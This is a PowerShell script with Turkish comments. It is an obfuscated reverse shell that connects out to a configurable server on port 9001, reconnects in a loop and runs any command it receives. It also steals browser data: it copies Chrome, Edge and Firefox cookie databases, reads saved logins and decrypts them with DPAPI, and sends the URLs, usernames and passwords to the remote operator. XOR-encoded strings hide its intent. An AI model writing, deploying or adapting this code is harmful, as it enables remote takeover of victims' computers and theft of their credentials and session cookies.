$server = $($k8577=71;$b=[byte[]](0x76,0x77,0x69,0x76,0x77,0x69,0x76,0x77,0x69,0x76,0x77);-join($b|%{[char]($_-bxor$k8577)}))  # <-- IP'ni değiştir
$port = 9001             # <-- Portunu değiştir

function Connect-ReverseShell {
    while ($true) {
        try {
            $client = New-Object Net.Sockets.TCPClient($server, $port)
            $stream = $client.GetStream()
            $reader = New-Object IO.StreamReader($stream)
            $writer = New-Object IO.StreamWriter($stream)
            $writer.AutoFlush = $true

            $writer.WriteLine(($($k7899=28;$b=[byte[]](0x47,0x37,0x41,0x3c,0x5f,0x73,0x72,0x72,0x79,0x7f,0x68,0x79,0x78,0x3c,0x7a,0x6e,0x73,0x71,0x3c);-join($b|%{[char]($_-bxor$k7899)})) + $env + $($k3228=';JEi]#AA';$b=[byte[]](0x01,0x09,0x0A,0x24,0x0D,0x76,0x15,0x04,0x69,0x04,0x04,0x24,0x18,0x03,0x69);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3228);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + $env + $($k4356='aV:>;4JgiO';$b=[byte[]](0x5B,0x03,0x69,0x7B,0x69,0x7A,0x0B,0x2A,0x2C,0x66);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4356);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))))

            # Browser verilerini çek ve gönder
            Send-BrowserData $writer

            while ($client.Connected) {
                try {
                    $cmd = $reader.ReadLine()
                    if ($null -eq $cmd) { break }

                    if ($cmd -eq $($k2653='h{1^?.aC,V-Wu';$b=[byte[]](0x0D,0x03,0x58,0x2A);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2653);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -or $cmd -eq ([string]::Format('{0}{1}','qui','t'))) {
                        $writer.WriteLine(('{0}{1}{2}{3}{4}{5}' -f '[+',']',' Go','odby','e','!'))
                        break
                    }

                    $output = Invoke-Expression $cmd 2>&1 | Out-String
                    $writer.WriteLine($output)
                }
                catch {
                    $writer.WriteLine(($($k2526='2-gSZ';$b=[byte[]](0x77,0x7F,0x35,0x1C,0x08,0x08,0x0D);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2526);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + $($_.Exception.Message)))
                }
            }
        }
        catch {
            # Bağlantı hatası olursa sessizce bekle ve tekrar dene
        }
        finally {
            if ($client) { $client.Close() }
            Start-Sleep -Seconds 10  # 10 saniye sonra tekrar bağlan
        }
    }
}

function Send-BrowserData {
    param($writer)

    $writer.WriteLine(('{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}{11}{12}{13}{14}{15}' -f '`n','[*','] Ta','r','a','y','ici v','eri','leri',' t','op','lanıy','or','.','..','`n'))

    $browsers = @(
        @{Name=([string]::Format('{0}{1}','Chrom','e')); Path=($env + $($k2308='v1L)wNbV>r>lI';$b=[byte[]](0x4C,0x7D,0x03,0x6A,0x36,0x02,0x23,0x06,0x6E,0x36,0x7F,0x38,0x08,0x2A,0x76,0x23,0x46,0x10,0x22,0x07,0x0A,0x7D,0x1A,0x4C,0x03,0x24,0x13,0x6D,0x19,0x5A,0x12,0x3C,0x42,0x12,0x5F,0x06,0x5F,0x30,0x0D,0x13,0x57,0x2D,0x5C,0x1B,0x3A);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2308);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))},
        @{Name=$($k3298='+UheF*2';$b=[byte[]](0x6E,0x31,0x0F,0x00);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3298);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}));   Path=($env + $($k9098='Hoe9$]r';$b=[byte[]](0x72,0x23,0x2A,0x7A,0x65,0x11,0x33,0x18,0x3F,0x21,0x78,0x70,0x1C,0x2E,0x05,0x06,0x06,0x4B,0x4B,0x2E,0x1D,0x2E,0x1B,0x39,0x7C,0x40,0x3A,0x17,0x14,0x3A,0x16,0x5C,0x56,0x7D,0x36,0x29,0x1B,0x04,0x65,0x60,0x38,0x14,0x29,0x1A,0x09,0x4D);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9098);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))},
        @{Name=$($k3637=222;$b=[byte[]](0x98,0xb7,0xac,0xbb,0xb8,0xb1,0xa6);-join($b|%{[char]($_-bxor$k3637)})); Path=($env + ('{0}{1}{2}{3}{4}{5}{6}{7}' -f ':APPD','ATA\M','ozil','la','\Fir','efox','\Prof','iles'))}
    )

    foreach ($browser in $browsers) {
        try {
            if (Test-Path $browser.Path) {
                $writer.WriteLine(($($k6097='Cl2jeeii0,';$b=[byte[]](0x18,0x47,0x6F,0x4A);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6097);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + $($browser.Name) + $($k7930=120;$b=[byte[]](0x58,0x1a,0x0d,0x14,0x0d,0x16,0x1c,0x0d);-join($b|%{[char]($_-bxor$k7930)}))))

                # Cookies
                $cookiePaths = @()
                if ($browser.Name -eq ('{0}{1}' -f 'Fire','fox')) {
                    $profiles = Get-ChildItem ($($browser.Path) + $($k5752=28;$b=[byte[]](0x40,0x36,0x32,0x78,0x79,0x7a,0x7d,0x69,0x70,0x68,0x31,0x6e,0x79,0x70,0x79,0x7d,0x6f,0x79);-join($b|%{[char]($_-bxor$k5752)}))) -Directory
                    foreach ($p in $profiles) { $cookiePaths += ($($p.FullName) + ('{0}{1}{2}{3}{4}{5}' -f '\c','oo','kies','.','sq','lite')) }
                } else {
                    $cookiePaths += ($($browser.Path) + $($k7684=207;$b=[byte[]](0x93,0x81,0xaa,0xbb,0xb8,0xa0,0xbd,0xa4,0x93,0x8c,0xa0,0xa0,0xa4,0xa6,0xaa,0xbc);-join($b|%{[char]($_-bxor$k7684)})))
                }

                foreach ($cp in $cookiePaths) {
                    if (Test-Path $cp) {
                        Copy-Item $cp ($env + $($k2602=149;$b=[byte[]](0xaf,0xc1,0xd0,0xd8,0xc5,0xc9,0xf6,0xfa,0xfa,0xfe,0xfc,0xf0,0xe6,0xca);-join($b|%{[char]($_-bxor$k2602)})) + $(Get-Random) + $($k8248=120;$b=[byte[]](0x56,0x0c,0x15,0x08);-join($b|%{[char]($_-bxor$k8248)}))) -Force
                        $size = (Get-Item ($env + ([string]::Format('{0}{1}{2}{3}{4}{5}',':','TEMP\','co','okie','s_*','.tmp')))).Length
                        $writer.WriteLine((('{0}{1}{2}{3}' -f '   ',' Coo','kie D','B: ') + $cp + ([string]::Format('{0}{1}{2}{3}',' ','(','bo','yut: ')) + $size + ('{0}{1}' -f ' byte','s)')))
                        Remove-Item ($env + ([string]::Format('{0}{1}{2}{3}{4}{5}{6}',':T','E','MP\','cook','ies_','*.tm','p'))) -Force
                    }
                }

                # Login Data (şifreler)
                $loginPath = ($($browser.Path) + $($k1577='?;t3s-_AG';$b=[byte[]](0x63,0x77,0x1B,0x54,0x1A,0x43,0x7F,0x05,0x26,0x4B,0x5A);$kb=[System.Text.Encoding]::UTF8.GetBytes($k1577);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))
                if (Test-Path $loginPath -and $browser.Name -ne $($k7591=';4zTMWYhV';$b=[byte[]](0x7D,0x5D,0x08,0x31,0x2B,0x38,0x21);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7591);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) {
                    Copy-Item $loginPath ($env + ([string]::Format('{0}{1}{2}{3}{4}{5}',':T','EMP\','logi','ns.t','m','p'))) -Force
                    try {
                        $conn = New-Object Data.SQLite.SQLiteConnection((([string]::Format('{0}{1}{2}{3}','Dat','a So','urce','=')) + $env + ([string]::Format('{0}{1}{2}{3}{4}{5}{6}',':TE','M','P\lo','gi','ns.t','m','p'))))
                        $conn.Open()
                        $cmd = $conn.CreateCommand()
                        $cmd.CommandText = ('{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}{11}{12}{13}{14}{15}{16}{17}{18}{19}{20}{21}' -f 'SELE','CT',' or','i','gin_u','rl',', ','u','s','ern','ame_v','a','lu','e, pa','ss','word_','va','lu','e FR','OM l','ogin','s')
                        $r = $cmd.ExecuteReader()
                        $count = 0
                        while ($r.Read()) {
                            $url = $r.GetString(0)
                            $user = $r.GetString(1)
                            $encPass = $r.GetValue(2)
                            try {
                                $decPass = [Runtime.InteropServices.Marshal]::PtrToStringUni([Runtime.InteropServices.Marshal]::SecureStringToBSTR((New-Object Security.SecureString)))
                                # DPAPI decrypt (Chrome/Edge)
                                $decPass = [Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, $($k6969=27;$b=[byte[]](0x58,0x6e,0x69,0x69,0x7e,0x75,0x6f,0x4e,0x68,0x7e,0x69);-join($b|%{[char]($_-bxor$k6969)}))))
                                $writer.WriteLine(($($k4553=170;$b=[byte[]](0x8a,0x8a,0x8a,0x8a,0x6f,0x34,0xc3,0xcc,0xd8,0xcf,0x90,0x8a);-join($b|%{[char]($_-bxor$k4553)})) + $url + $($k5633='H:9P{&fB';$b=[byte[]](0x68,0x46,0x19);$kb=[System.Text.Encoding]::UTF8.GetBytes($k5633);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + $user + $($k3406='O-t+6uZbmFgC';$b=[byte[]](0x6F,0x51,0x54);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3406);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + $decPass))
                                $count++
                            } catch {}
                        }
                        $r.Close()
                        $conn.Close()
                        if ($count -eq 0) { $writer.WriteLine(('{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}{11}{12}{13}{14}' -f '    ','Ka','y','ded','ilm','i','ş ş','ifre',' yok ','veya',' dec','ryp','t edi','lemed','i')) }
                    } catch {
                        $writer.WriteLine($($k1678=96;$b=[byte[]](0x40,0x40,0x40,0x40,0x2c,0x0f,0x07,0x09,0x0e,0x40,0x24,0x01,0x14,0x01,0x40,0x0f,0x0b,0x15,0x0e,0x01,0x0d,0x01,0x04,0xa4,0xd1,0x40,0x48,0x0b,0x09,0x0c,0x09,0x14,0x0c,0x09,0x40,0x0f,0x0c,0x01,0x02,0x09,0x0c,0x09,0x12,0x49);-join($b|%{[char]($_-bxor$k1678)})))
                    }
                    Remove-Item ($env + ('{0}{1}{2}{3}' -f ':TEMP','\','login','s.tmp')) -Force
                }

                # History
                $historyPath = ($($browser.Path) + ([string]::Format('{0}{1}{2}{3}','\Hist','o','r','y')))
                if (Test-Path $historyPath -and $browser.Name -ne ('{0}{1}{2}' -f 'Fir','efo','x')) {
                    Copy-Item $historyPath ($env + ([string]::Format('{0}{1}{2}{3}{4}{5}',':T','EMP\','histo','r','y.tm','p'))) -Force
                    $writer.WriteLine(([string]::Format('{0}{1}{2}{3}{4}{5}{6}{7}{8}','   ',' ','H','isto','ry D','B',' bu','lund','u')))
                    Remove-Item ($env + ('{0}{1}{2}{3}{4}{5}' -f ':TEMP','\','histo','ry.','t','mp')) -Force
                }
            }
        } catch {
            $writer.WriteLine((('{0}{1}' -f '[-]',' ') + $($browser.Name) + ('{0}{1}{2}{3}{4}{5}' -f ' ','ha','ta','sı',':',' ') + $($_.Exception.Message)))
        }
    }

    $writer.WriteLine($($k6448=206;$b=[byte[]](0xae,0xa0,0x95,0xe4,0x93,0xee,0x9a,0xaf,0xbc,0xaf,0xb7,0xa7,0xad,0xa7,0xee,0xb8,0xab,0xbc,0xa7,0xa2,0xab,0xbc,0xa7,0xee,0xba,0xa1,0xbe,0xa2,0xaf,0xa3,0xaf,0xee,0xba,0xaf,0xa3,0xaf,0xa3,0xa2,0xaf,0xa0,0xaa,0x0a,0x7f,0xe0,0xae,0xa0);-join($b|%{[char]($_-bxor$k6448)})))
}

Connect-ReverseShell
